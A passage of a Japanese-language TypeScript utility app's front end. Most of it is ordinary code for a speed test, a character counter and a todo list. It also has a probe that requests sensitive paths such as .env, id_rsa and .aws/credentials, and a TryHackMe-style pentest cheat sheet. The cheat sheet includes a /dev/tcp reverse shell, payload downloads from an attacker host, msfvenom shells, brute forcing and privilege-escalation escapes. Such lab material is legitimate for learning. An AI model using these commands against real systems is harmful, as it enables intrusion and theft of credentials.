        for (const a of data.Authority) {
          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
        }
      }
      outEl.textContent = lines.join("\n");
    } catch (e) {
      outEl.textContent = `エラー: ${e}`;
    }
  });
  function typeName(n: number): string {
    return (
      (
        {
          1: "A",
          2: "NS",
          5: "CNAME",
          6: "SOA",
          12: "PTR",
          15: "MX",
          16: "TXT",
          28: "AAAA",
          33: "SRV",
        } as Record<number, string>
      )[n] || String(n)
    );
  }
}

function setupSensitiveFilesSub(): void {
  const baseEl = document.getElementById("sf-base") as HTMLInputElement | null;
  const runBtn = document.getElementById("sf-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("sf-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  const PATHS = [
    "robots.txt",
    "sitemap.xml",
    ".git/HEAD",
    ".git/config",
    ".gitignore",
    ".env",
    ".env.local",
    ".env.production",
    ".htaccess",
    ".htpasswd",
    ".svn/entries",
    ".DS_Store",
    "config.php",
    "config.php.bak",
    "wp-config.php",
    "wp-config.php.bak",
    "phpinfo.php",
    "info.php",
    "test.php",
    "server-status",
    "server-info",
    ".well-known/security.txt",
    "crossdomain.xml",
    "backup.zip",
    "backup.tar.gz",
    "db.sql",
    "dump.sql",
    "id_rsa",
    "composer.json",
    "package.json",
    "Gemfile",
    ".aws/credentials",
    ".npmrc",
    ".bash_history",
    "console",
    "actuator",
    "actuator/health",
    "actuator/env",
    "swagger.json",
    "swagger-ui.html",
    "api/swagger",
    "api-docs",
    "graphql",
  ];
  runBtn.addEventListener("click", async () => {
    const base = (baseEl?.value || "").trim().replace(/\/+$/, "");
    if (!base) {
      outEl.textContent = "ベースURL 必須";
      return;
    }
    outEl.textContent = "";
    for (const p of PATHS) {
      const url = `${base}/${p}`;
      try {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method: "GET",
          url,
          headers: [],
          body: null,
          timeoutMs: 5000,
          followRedirects: false,
        });
        const interesting =
          r.status === 200 || r.status === 401 || r.status === 403;
        const tag = interesting ? "⚠️" : "  ";
        outEl.textContent += `${tag} [${r.status}] ${url}  (${r.bytes}B)\n`;
        outEl.scrollTop = outEl.scrollHeight;
      } catch {
        outEl.textContent += `   [ERR] ${url}\n`;
      }
    }
  });
}

const THM_CHEAT = `# === 偵察 ===
nmap -sC -sV -oN nmap.log <IP>
nmap -p- --min-rate 1000 <IP>          # 全 65535 ポート高速
nmap -sU --top-ports 50 <IP>            # UDP top 50
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404 http://<IP>/FUZZ
nikto -h http://<IP>
whatweb http://<IP>

# === SMB ===
enum4linux -a <IP>
smbclient -L //<IP> -N
smbclient //<IP>/share -N
smbmap -H <IP>

# === ブルートフォース ===
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P pass.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P rockyou.txt <IP> ftp

# === ハッシュ ===
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt        # MD5
hashcat -m 1000 hash.txt rockyou.txt                          # NTLM
hashcat -m 1600 '$apr1$...' rockyou.txt                       # APR1
hashcat -m 1800 hash.txt rockyou.txt                          # SHA-512 crypt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh2john id_rsa > hash; john hash --wordlist=rockyou.txt
zip2john file.zip > hash
rar2john file.rar > hash

# === sqlmap ===
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -r req.txt -p username --dbs                     # Burp で保存した raw リクエスト
sqlmap -r req.txt -p username --current-user
sqlmap -r req.txt -D <db> --tables
sqlmap -r req.txt -D <db> -T <tbl> --dump
sqlmap -u "..." --os-shell

# === リバースシェル ===
nc -lvnp 4444                                             # リスナー
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")'           # PTY 安定化
Ctrl+Z; stty raw -echo; fg; reset                        # フル端末

# === 権限昇格 (Linux) ===
sudo -l                                                    # 何が NOPASSWD で実行できるか
find / -perm -u=s -type f 2>/dev/null                     # SUID
find / -perm -4000 2>/dev/null
find / -writable -type f 2>/dev/null
getcap -r / 2>/dev/null                                    # capabilities
cat /etc/crontab                                          # cron
ls -la /etc/cron.*
./linpeas.sh
./LinEnum.sh
# 配信:
python3 -m http.server 8000             # 攻撃側
wget http://<LHOST>:8000/linpeas.sh     # 被害側
chmod +x linpeas.sh && ./linpeas.sh

# === 権限昇格 (Windows) ===
whoami /priv
whoami /groups
systeminfo
.\\winPEASany.exe
.\\PowerUp.ps1; Invoke-AllChecks

# === GTFOBins (sudo / SUID 抜け道の代表) ===
sudo systemctl ; sudo find / -exec /bin/sh \\;
sudo vim -c ':!/bin/sh' ; sudo less file ; !sh
SUID /bin/bash → /bin/bash -p

# === ファイル転送 ===
# 攻撃側:
python3 -m http.server 80
# 被害側:
wget http://<LHOST>/file
curl -O http://<LHOST>/file
certutil -urlcache -f http://<LHOST>/file file.exe   # Windows

# === MSF ===
msfconsole
search <name>
use <id>; show options; set RHOSTS <IP>; run
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > sh.exe
`;

function setupPentestTool(): void {
  setupPortScannerSub();
  setupHttpReqSub();
  setupDirBusterSub();
  setupSqliSub();
  setupHashIdSub();
  setupHashGenSub();
  setupEncodeSub();
  setupRevShellSub();
  setupJwtSub();
  setupDnsSub();
  setupSensitiveFilesSub();
  const cheat = document.getElementById("thm-cheat");
  if (cheat) cheat.textContent = THM_CHEAT;
}

// ===== 📶 スピードテスト =====

interface SpeedDownloadResultTS {
  bytes: number;
  time_ms: number;
  mbps: number;
  status: number;
  final_url: string;
}
interface SpeedUploadResultTS {
  bytes: number;
  time_ms: number;
  mbps: number;
  status: number;
}
interface SpeedPingResultTS {
  samples_ms: number[];
  success: number;
  failed: number;
  avg_ms: number;
  min_ms: number;
  max_ms: number;
  jitter_ms: number;
}

interface SpeedHistoryEntry {
  ts: number;
  dlMbps: number | null;
  ulMbps: number | null;
  pingMs: number | null;
  jitterMs: number | null;
  dlBytes: number | null;
}

const speedHistory: SpeedHistoryEntry[] = [];
let speedAutoTimer: number | null = null;
let speedRunning = false;

function drawSpeedChart(): void {
  const canvas = document.getElementById(
    "st-chart",
  ) as HTMLCanvasElement | null;
  if (!canvas) return;
  const dpr = window.devicePixelRatio || 1;
  const cssW = canvas.clientWidth || 900;
  const cssH = canvas.clientHeight || 240;
  if (canvas.width !== cssW * dpr || canvas.height !== cssH * dpr) {
    canvas.width = cssW * dpr;
    canvas.height = cssH * dpr;
  }
  const ctx = canvas.getContext("2d");
  if (!ctx) return;
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  const W = cssW;
  const H = cssH;
  ctx.clearRect(0, 0, W, H);
  const padL = 44,
    padR = 44,
    padT = 10,
    padB = 22;
  const plotW = W - padL - padR;
  const plotH = H - padT - padB;

  const data = speedHistory;
  if (data.length === 0) {
    ctx.fillStyle = "#999";
    ctx.font = "12px sans-serif";
    ctx.textAlign = "center";
    ctx.fillText("データなし — 「テスト実行」を押してください", W / 2, H / 2);
    return;
  }

  const mbpsValues: number[] = [];
  for (const e of data) {
    if (e.dlMbps != null) mbpsValues.push(e.dlMbps);
    if (e.ulMbps != null) mbpsValues.push(e.ulMbps);
  }
  const pingValues = data
    .map((e) => e.pingMs)
    .filter((v): v is number => v != null);
  const maxMbps = Math.max(10, ...mbpsValues) * 1.1;
  const maxPing = Math.max(50, ...pingValues) * 1.2;

  // grid
  ctx.strokeStyle = "#eee";
  ctx.lineWidth = 1;
  ctx.fillStyle = "#666";
  ctx.font = "10px sans-serif";
  ctx.textAlign = "right";
  for (let i = 0; i <= 5; i++) {
    const y = padT + (plotH * i) / 5;
    ctx.beginPath();
    ctx.moveTo(padL, y);
    ctx.lineTo(padL + plotW, y);
    ctx.stroke();
    const mbps = maxMbps * (1 - i / 5);
    ctx.fillStyle = "#1f883d";
    ctx.fillText(mbps.toFixed(0), padL - 4, y + 3);
    const ping = maxPing * (1 - i / 5);
    ctx.fillStyle = "#cf222e";
    ctx.textAlign = "left";
    ctx.fillText(ping.toFixed(0), padL + plotW + 4, y + 3);
    ctx.textAlign = "right";
  }

  // axis labels
  ctx.fillStyle = "#1f883d";
  ctx.textAlign = "left";
  ctx.fillText("Mbps", padL - 30, padT - 2);
  ctx.fillStyle = "#cf222e";
  ctx.textAlign = "right";
  ctx.fillText("ms", padL + plotW + 26, padT - 2);

  const n = data.length;
  function xAt(i: number): number {
    if (n === 1) return padL + plotW / 2;
    return padL + (plotW * i) / (n - 1);
  }

  function plotLine(
    getter: (e: SpeedHistoryEntry) => number | null,
    color: string,
    max: number,
  ): void {
    const c = ctx!;
    c.strokeStyle = color;
    c.lineWidth = 2;
    c.beginPath();
    let started = false;
    for (let i = 0; i < n; i++) {
      const v = getter(data[i]);
      if (v == null) {
        started = false;
        continue;
      }
      const x = xAt(i);
      const y = padT + plotH * (1 - v / max);
      if (!started) {
        c.moveTo(x, y);
        started = true;
      } else c.lineTo(x, y);
    }
    c.stroke();
    c.fillStyle = color;
    for (let i = 0; i < n; i++) {
      const v = getter(data[i]);
      if (v == null) continue;
      const x = xAt(i);
      const y = padT + plotH * (1 - v / max);
      c.beginPath();
      c.arc(x, y, 2.5, 0, Math.PI * 2);
      c.fill();
    }
  }

  plotLine((e) => e.dlMbps, "#1f883d", maxMbps);
  plotLine((e) => e.ulMbps, "#0969da", maxMbps);
  plotLine((e) => e.pingMs, "#cf222e", maxPing);

  // x-axis time labels
  ctx.fillStyle = "#666";
  ctx.textAlign = "center";
  const ticks = Math.min(n, 6);
  for (let i = 0; i < ticks; i++) {
    const idx = Math.round(((n - 1) * i) / (ticks - 1 || 1));
    const e = data[idx];
    const x = xAt(idx);
    const d = new Date(e.ts);
    const lbl = `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
    ctx.fillText(lbl, x, H - 6);
  }
}

function updateSpeedHistoryTable(): void {
  const tbody = document.querySelector(
    "#st-history tbody",
  ) as HTMLTableSectionElement | null;
  if (!tbody) return;
  const rows: string[] = [];
  for (let i = speedHistory.length - 1; i >= 0; i--) {
    const e = speedHistory[i];
    const t = new Date(e.ts).toLocaleTimeString();
    rows.push(
      `<tr><td style="padding:3px 4px">${t}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#1f883d">${e.dlMbps?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#0969da">${e.ulMbps?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#cf222e">${e.pingMs?.toFixed(1) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right">${e.jitterMs?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right">${e.dlBytes?.toLocaleString() ?? "—"}</td></tr>`,
    );
  }
  tbody.innerHTML = rows.join("");
}

async function runSpeedtestOnce(statusEl: HTMLElement | null): Promise<void> {
  if (speedRunning) return;
  speedRunning = true;
  const presetEl = document.getElementById(
    "st-dl-preset",
  ) as HTMLSelectElement | null;
  const dlUrlEl = document.getElementById(
    "st-dl-url",
  ) as HTMLInputElement | null;
  const ulUrlEl = document.getElementById(
    "st-ul-url",
  ) as HTMLInputElement | null;
  const pingHostEl = document.getElementById(
    "st-ping-host",
  ) as HTMLInputElement | null;
  const pingPortEl = document.getElementById(
    "st-ping-port",
  ) as HTMLInputElement | null;
  const pingCountEl = document.getElementById(
    "st-ping-count",
  ) as HTMLInputElement | null;
  const capEl = document.getElementById("st-cap") as HTMLSelectElement | null;
  const ulSizeEl = document.getElementById(
    "st-ul-size",
  ) as HTMLSelectElement | null;
  const statDl = document.getElementById("st-stat-dl");
  const statUl = document.getElementById("st-stat-ul");
  const statPing = document.getElementById("st-stat-ping");
  const statJitter = document.getElementById("st-stat-jitter");

  const dlUrl =
    presetEl?.value === "custom"
      ? dlUrlEl?.value.trim() || ""
      : presetEl?.value || "";
  const ulUrl = ulUrlEl?.value.trim() || "";
  const pingHost = pingHostEl?.value.trim() || "";
  const pingPort = parseInt(pingPortEl?.value || "443");
  const pingCount = parseInt(pingCountEl?.value || "5");
  const capMb = parseInt(capEl?.value || "10");
  const ulSizeMb = parseInt(ulSizeEl?.value || "2");

  const entry: SpeedHistoryEntry = {
    ts: Date.now(),
    dlMbps: null,
    ulMbps: null,
    pingMs: null,
    jitterMs: null,
    dlBytes: null,
  };

  try {
    if (pingHost) {
      if (statusEl)
        statusEl.textContent = `Ping ${pingHost}:${pingPort} ×${pingCount}…`;
      try {
        const p = await invoke<SpeedPingResultTS>("speedtest_ping", {
          host: pingHost,
          port: pingPort,
          count: pingCount,
        });
        entry.pingMs = p.avg_ms;
        entry.jitterMs = p.jitter_ms;
        if (statPing) statPing.textContent = `${p.avg_ms.toFixed(1)} ms`;
        if (statJitter) statJitter.textContent = `${p.jitter_ms.toFixed(2)} ms`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Ping エラー: ${e}`;
      }
    }

    if (dlUrl) {
      if (statusEl)
        statusEl.textContent = `ダウンロードテスト中… (上限 ${capMb}MB)`;
      try {
        const d = await invoke<SpeedDownloadResultTS>("speedtest_download", {
          url: dlUrl,
          maxBytes: capMb * 1024 * 1024,
          timeoutMs: 30000,
        });
        entry.dlMbps = d.mbps;
        entry.dlBytes = d.bytes;
        if (statDl) statDl.textContent = `${d.mbps.toFixed(2)} Mbps`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Download エラー: ${e}`;
      }
    }

    if (ulUrl && ulSizeMb > 0) {
      if (statusEl)
        statusEl.textContent = `アップロードテスト中… (${ulSizeMb}MB)`;
      try {
        const u = await invoke<SpeedUploadResultTS>("speedtest_upload", {
          url: ulUrl,
          sizeBytes: ulSizeMb * 1024 * 1024,
          timeoutMs: 30000,
        });
        entry.ulMbps = u.mbps;
        if (statUl) statUl.textContent = `${u.mbps.toFixed(2)} Mbps`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Upload エラー: ${e}`;
      }
    }

    speedHistory.push(entry);
    if (speedHistory.length > 500) speedHistory.shift();
    drawSpeedChart();
    updateSpeedHistoryTable();
    if (statusEl) {
      const t = new Date(entry.ts).toLocaleTimeString();
      statusEl.textContent = `完了 ${t} — ↓${entry.dlMbps?.toFixed(2) ?? "—"} ↑${entry.ulMbps?.toFixed(2) ?? "—"} Mbps / ping ${entry.pingMs?.toFixed(1) ?? "—"}ms`;
    }
  } finally {
    speedRunning = false;
  }
}

function setupSpeedtestTool(): void {
  const presetEl = document.getElementById(
    "st-dl-preset",
  ) as HTMLSelectElement | null;
  const dlUrlEl = document.getElementById(
    "st-dl-url",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("st-run") as HTMLButtonElement | null;
  const autoBtn = document.getElementById(
    "st-auto",
  ) as HTMLButtonElement | null;
  const stopBtn = document.getElementById(
    "st-stop",
  ) as HTMLButtonElement | null;
  const clearBtn = document.getElementById(
    "st-clear",
  ) as HTMLButtonElement | null;
  const exportBtn = document.getElementById(
    "st-export",
  ) as HTMLButtonElement | null;
  const intervalEl = document.getElementById(
    "st-interval",
  ) as HTMLInputElement | null;
  const statusEl = document.getElementById("st-status");
  if (!runBtn) return;

  presetEl?.addEventListener("change", () => {
    if (!dlUrlEl) return;
    if (presetEl.value === "custom") {
      dlUrlEl.hidden = false;
    } else {
      dlUrlEl.hidden = true;
    }
  });

  runBtn.addEventListener("click", () => {
    runSpeedtestOnce(statusEl);
  });

  autoBtn?.addEventListener("click", () => {
    if (speedAutoTimer != null) return;
    const sec = Math.max(5, parseInt(intervalEl?.value || "0"));
    if (!sec || sec < 5) {
      if (statusEl) statusEl.textContent = "間隔は 5 秒以上を指定してください";
      return;
    }
    if (statusEl) statusEl.textContent = `定期実行 開始 (${sec} 秒間隔)`;
    runSpeedtestOnce(statusEl);
    speedAutoTimer = window.setInterval(() => {
      runSpeedtestOnce(statusEl);
    }, sec * 1000);
    autoBtn.textContent = "● 実行中";
    autoBtn.style.background = "#cf222e";
  });

  stopBtn?.addEventListener("click", () => {
    if (speedAutoTimer != null) {
      window.clearInterval(speedAutoTimer);
      speedAutoTimer = null;
    }
    if (autoBtn) {
      autoBtn.textContent = "▶ 定期開始";
      autoBtn.style.background = "#6f42c1";
    }
    if (statusEl) statusEl.textContent = "定期実行 停止";
  });

  clearBtn?.addEventListener("click", () => {
    speedHistory.length = 0;
    drawSpeedChart();
    updateSpeedHistoryTable();
    if (statusEl) statusEl.textContent = "履歴クリア";
  });

  exportBtn?.addEventListener("click", () => {
    const lines = ["timestamp,iso,dl_mbps,ul_mbps,ping_ms,jitter_ms,dl_bytes"];
    for (const e of speedHistory) {
      lines.push(
        [
          e.ts,
          new Date(e.ts).toISOString(),
          e.dlMbps?.toFixed(4) ?? "",
          e.ulMbps?.toFixed(4) ?? "",
          e.pingMs?.toFixed(3) ?? "",
          e.jitterMs?.toFixed(3) ?? "",
          e.dlBytes ?? "",
        ].join(","),
      );
    }
    const blob = new Blob([lines.join("\n")], {
      type: "text/csv;charset=utf-8",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `speedtest-${new Date().toISOString().replace(/[:.]/g, "-")}.csv`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  drawSpeedChart();
  window.addEventListener("resize", () => drawSpeedChart());
}

// ===== 文字数カウント =====
function setupCharCountTool(): void {
  const inputN = document.getElementById(
    "cc-input",
  ) as HTMLTextAreaElement | null;
  if (!inputN) return;
  const input = inputN;
  const trim = document.getElementById("cc-trim") as HTMLInputElement;
  const collapse = document.getElementById("cc-collapse") as HTMLInputElement;
  const status = document.getElementById("cc-status") as HTMLSpanElement;
  const elChars = document.getElementById("cc-chars") as HTMLDivElement;
  const elCharsNs = document.getElementById("cc-chars-ns") as HTMLDivElement;
  const elBytes = document.getElementById("cc-bytes") as HTMLDivElement;
  const elLines = document.getElementById("cc-lines") as HTMLDivElement;
  const elWords = document.getElementById("cc-words") as HTMLDivElement;
  const elPara = document.getElementById("cc-paragraphs") as HTMLDivElement;
  const elFw = document.getElementById("cc-fullwidth") as HTMLDivElement;
  const elHw = document.getElementById("cc-halfwidth") as HTMLDivElement;
  const tw = document.getElementById("cc-twitter-bar") as HTMLDivElement;
  const twT = document.getElementById("cc-twitter-text") as HTMLSpanElement;
  const sm = document.getElementById("cc-sms-bar") as HTMLDivElement;
  const smT = document.getElementById("cc-sms-text") as HTMLSpanElement;
  const gk = document.getElementById("cc-genko-bar") as HTMLDivElement;
  const gkT = document.getElementById("cc-genko-text") as HTMLSpanElement;
  const breakdown = document.getElementById("cc-breakdown") as HTMLPreElement;

  function isFullWidth(c: string): boolean {
    const code = c.codePointAt(0) ?? 0;
    return (
      (code >= 0x1100 && code <= 0x115f) ||
      (code >= 0x2e80 && code <= 0x303e) ||
      (code >= 0x3041 && code <= 0x33ff) ||
      (code >= 0x3400 && code <= 0x4dbf) ||
      (code >= 0x4e00 && code <= 0x9fff) ||
      (code >= 0xa000 && code <= 0xa4cf) ||
      (code >= 0xac00 && code <= 0xd7a3) ||
      (code >= 0xf900 && code <= 0xfaff) ||
      (code >= 0xfe30 && code <= 0xfe4f) ||
      (code >= 0xff00 && code <= 0xff60) ||
      (code >= 0xffe0 && code <= 0xffe6) ||
      (code >= 0x20000 && code <= 0x2fffd) ||
      (code >= 0x30000 && code <= 0x3fffd)
    );
  }

  function recompute(): void {
    let txt = input.value;
    if (trim.checked) txt = txt.trim();
    if (collapse.checked) txt = txt.replace(/[ \t\u3000]+/g, " ");
    const codepoints = Array.from(txt);
    const chars = codepoints.length;
    const charsNs = codepoints.filter((c) => !/\s/.test(c)).length;
    const bytes = new TextEncoder().encode(txt).length;
    const lines = txt.length === 0 ? 0 : txt.split(/\r\n|\r|\n/).length;
    const words = (txt.match(/[A-Za-z0-9_'\-]+|[\p{L}\p{N}]+/gu) ?? []).length;
    const paragraphs = txt
      .split(/\n\s*\n/)
      .filter((p) => p.trim().length > 0).length;
    let fw = 0,
      hw = 0;
    let counts: Record<string, number> = {
      ひらがな: 0,
      カタカナ: 0,
      漢字: 0,
      英字: 0,
      数字: 0,
      記号: 0,
      空白: 0,
      改行: 0,
      "絵文字/その他": 0,
    };
    for (const c of codepoints) {
      if (isFullWidth(c)) fw++;
      else hw++;
      const cp = c.codePointAt(0) ?? 0;
      if (cp >= 0x3041 && cp <= 0x309f) counts["ひらがな"]++;
      else if (cp >= 0x30a0 && cp <= 0x30ff) counts["カタカナ"]++;
      else if ((cp >= 0x4e00 && cp <= 0x9fff) || (cp >= 0x3400 && cp <= 0x4dbf))
        counts["漢字"]++;
      else if (/[A-Za-z]/.test(c)) counts["英字"]++;
      else if (/[0-9]/.test(c)) counts["数字"]++;
      else if (c === "\n" || c === "\r") counts["改行"]++;
      else if (/\s/.test(c)) counts["空白"]++;
      else if (cp < 0x80) counts["記号"]++;
      else if (cp >= 0x2000 && cp < 0x3000) counts["記号"]++;
      else counts["絵文字/その他"]++;
    }
    elChars.textContent = chars.toLocaleString();
    elCharsNs.textContent = charsNs.toLocaleString();
    elBytes.textContent = bytes.toLocaleString();
    elLines.textContent = lines.toLocaleString();
    elWords.textContent = words.toLocaleString();
    elPara.textContent = paragraphs.toLocaleString();
    elFw.textContent = fw.toLocaleString();
    elHw.textContent = hw.toLocaleString();
    const twPct = Math.min(100, (chars / 280) * 100);
    tw.style.width = twPct + "%";
    tw.style.background = chars > 280 ? "#cf222e" : "#1da1f2";
    twT.textContent = `${chars} / 280`;
    const smPct = Math.min(100, (chars / 160) * 100);
    sm.style.width = smPct + "%";
    sm.style.background = chars > 160 ? "#cf222e" : "#20c997";
    smT.textContent = `${chars} / 160`;
    const sheets = chars / 400;
    gk.style.width = Math.min(100, (sheets / 5) * 100) + "%";
    gkT.textContent = `${sheets.toFixed(2)} 枚`;
    const lines2 = Object.entries(counts)
      .map(([k, v]) => `  ${k.padEnd(14, " ")} ${String(v).padStart(6, " ")}`)
      .join("\n");
    breakdown.textContent = lines2;
    status.textContent = `更新: ${new Date().toLocaleTimeString()}`;
  }

  input.addEventListener("input", recompute);
  trim.addEventListener("change", recompute);
  collapse.addEventListener("change", recompute);
  document.getElementById("cc-clear")?.addEventListener("click", () => {
    input.value = "";
    recompute();
  });
  document.getElementById("cc-copy")?.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(input.value);
      status.textContent = "コピーしました";
    } catch {
      status.textContent = "コピー失敗";
    }
  });
  document.getElementById("cc-paste")?.addEventListener("click", async () => {
    try {
      input.value = await navigator.clipboard.readText();
      recompute();
    } catch {
      status.textContent = "貼り付け失敗";
    }
  });
  recompute();
}

// ===== Todo =====
interface TodoItem {
  id: string;
  text: string;
  done: boolean;
  priority: "low" | "medium" | "high";
  due: string | null;
  tags: string[];
  createdAt: number;
  doneAt: number | null;
}

const TODO_STORAGE_KEY = "yuzu-todo-v1";

function setupTodoTool(): void {
  const inputTextN = document.getElementById(
    "todo-text",
  ) as HTMLInputElement | null;
  if (!inputTextN) return;
  const inputText = inputTextN;
  const inputPri = document.getElementById(
    "todo-priority",
  ) as HTMLSelectElement;
  const inputDue = document.getElementById("todo-due") as HTMLInputElement;
  const inputTags = document.getElementById("todo-tags") as HTMLInputElement;
  const btnAdd = document.getElementById("todo-add") as HTMLButtonElement;
  const filter = document.getElementById("todo-filter") as HTMLSelectElement;
  const sort = document.getElementById("todo-sort") as HTMLSelectElement;
  const search = document.getElementById("todo-search") as HTMLInputElement;
  const list = document.getElementById("todo-list") as HTMLUListElement;
  const status = document.getElementById("todo-status") as HTMLSpanElement;
  const elTotal = document.getElementById("todo-total") as HTMLElement;
  const elActive = document.getElementById("todo-active") as HTMLElement;
  const elDone = document.getElementById("todo-done") as HTMLElement;
  const elOverdue = document.getElementById("todo-overdue") as HTMLElement;
  const elProg = document.getElementById("todo-progress") as HTMLElement;
  const elProgBar = document.getElementById(
    "todo-progress-bar",
  ) as HTMLDivElement;

  let items: TodoItem[] = [];
  try {
    const raw = localStorage.getItem(TODO_STORAGE_KEY);
    if (raw) items = JSON.parse(raw);
  } catch {
    /* ignore */
  }

  function save(): void {
    try {
      localStorage.setItem(TODO_STORAGE_KEY, JSON.stringify(items));
    } catch {
      /* ignore */
    }
  }

  function isOverdue(t: TodoItem): boolean {
    if (!t.due || t.done) return false;
    return new Date(t.due + "T23:59:59").getTime() < Date.now();
  }

  function render(): void {
    const q = search.value.trim().toLowerCase();
    const f = filter.value;
    const todayStr = new Date().toISOString().slice(0, 10);
    let visible = items.filter((t) => {
      if (
        q &&
        !(
          t.text.toLowerCase().includes(q) ||
          t.tags.some((x) => x.toLowerCase().includes(q))
        )
      )
        return false;
      if (f === "active" && t.done) return false;
      if (f === "done" && !t.done) return false;
      if (f === "overdue" && !isOverdue(t)) return false;
      if (f === "today" && (!t.due || t.due > todayStr || t.done)) return false;
      return true;
    });
    const priOrder = { high: 0, medium: 1, low: 2 } as const;
    switch (sort.value) {
      case "created-asc":
        visible.sort((a, b) => a.createdAt - b.createdAt);
        break;
      case "due-asc":
        visible.sort((a, b) =>
          (a.due ?? "9999").localeCompare(b.due ?? "9999"),
        );
        break;
      case "priority":
        visible.sort((a, b) => priOrder[a.priority] - priOrder[b.priority]);
        break;
      case "alpha":
        visible.sort((a, b) => a.text.localeCompare(b.text));
        break;
      default:
        visible.sort((a, b) => b.createdAt - a.createdAt);
    }
    list.textContent = "";
    for (const t of visible) {
      const li = document.createElement("li");
      li.className = "todo-item" + (t.done ? " done" : "");
      const cb = document.createElement("input");
      cb.type = "checkbox";
      cb.checked = t.done;
      cb.addEventListener("change", () => {
        t.done = cb.checked;
        t.doneAt = cb.checked ? Date.now() : null;
        save();
        render();
      });
      const main = document.createElement("div");
      main.style.flex = "1";
      const txt = document.createElement("div");
      txt.className = "todo-text todo-pri-" + t.priority;
      txt.textContent = t.text;
      txt.addEventListener("click", () => {
        const v = prompt("タスク内容を編集", t.text);
        if (v != null) {
          t.text = v;
          save();
          render();
        }
      });
      const meta = document.createElement("div");
      meta.className = "todo-meta";
      const created = document.createElement("span");
      created.textContent = "作成: " + new Date(t.createdAt).toLocaleString();
      meta.appendChild(created);
      if (t.due) {
        const d = document.createElement("span");
        d.textContent = "期限: " + t.due;
        if (isOverdue(t)) d.className = "todo-overdue";
        meta.appendChild(d);
      }
      const priLabel = document.createElement("span");
      priLabel.textContent =
        "優先度: " +
        ({ low: "低", medium: "中", high: "高" } as Record<string, string>)[
          t.priority
        ];
      meta.appendChild(priLabel);
      for (const tag of t.tags) {
        const tg = document.createElement("span");
        tg.className = "todo-tag";
        tg.textContent = "#" + tag;
        meta.appendChild(tg);
      }
      main.appendChild(txt);
      main.appendChild(meta);
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "🗑";
      del.title = "削除";
      del.addEventListener("click", () => {
        if (!confirm("削除しますか?")) return;
        items = items.filter((x) => x.id !== t.id);
        save();
        render();
      });
      li.appendChild(cb);
      li.appendChild(main);
      li.appendChild(del);
      list.appendChild(li);
    }
    const total = items.length;
    const done = items.filter((t) => t.done).length;
    const active = total - done;
    const overdue = items.filter(isOverdue).length;
    elTotal.textContent = String(total);
    elActive.textContent = String(active);
    elDone.textContent = String(done);
    elOverdue.textContent = String(overdue);
    const pct = total === 0 ? 0 : Math.round((done / total) * 100);
    elProg.textContent = pct + "%";
    elProgBar.style.width = pct + "%";
    status.textContent = `表示 ${visible.length} / ${total}`;
  }

  function add(): void {
    const text = inputText.value.trim();
    if (!text) return;
    const item: TodoItem = {
      id: Math.random().toString(36).slice(2, 11),
      text,
      done: false,
      priority: inputPri.value as TodoItem["priority"],
      due: inputDue.value || null,
      tags: inputTags.value
        .split(/[,、]/)
        .map((s) => s.trim())
        .filter(Boolean),
      createdAt: Date.now(),
      doneAt: null,
    };
    items.push(item);
    save();
    inputText.value = "";
    inputTags.value = "";
    inputDue.value = "";
    render();
  }

  btnAdd.addEventListener("click", add);
  inputText.addEventListener("keydown", (e) => {
    if (e.key === "Enter") add();
  });
  filter.addEventListener("change", render);
  sort.addEventListener("change", render);
  search.addEventListener("input", render);
  document.getElementById("todo-clear-done")?.addEventListener("click", () => {
    if (!confirm("完了済みを全て削除しますか?")) return;
    items = items.filter((t) => !t.done);
    save();
    render();
  });
  document.getElementById("todo-export")?.addEventListener("click", () => {
    const blob = new Blob([JSON.stringify(items, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "todo-" + new Date().toISOString().slice(0, 10) + ".json";
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
  const importBtn = document.getElementById("todo-import") as HTMLButtonElement;
  const importFile = document.getElementById(
    "todo-import-file",
  ) as HTMLInputElement;
  importBtn.addEventListener("click", () => importFile.click());
  importFile.addEventListener("change", async () => {
    const f = importFile.files?.[0];
    if (!f) return;
    try {
      const txt = await f.text();
      const arr = JSON.parse(txt) as TodoItem[];
      if (Array.isArray(arr)) {
        if (
          confirm(
            `${arr.length} 件をインポートします。既存に追加しますか? (キャンセル=置き換え)`,
          )
        ) {
          items = items.concat(arr);
        } else {
          items = arr;
        }
        save();
        render();
      }
    } catch (e) {
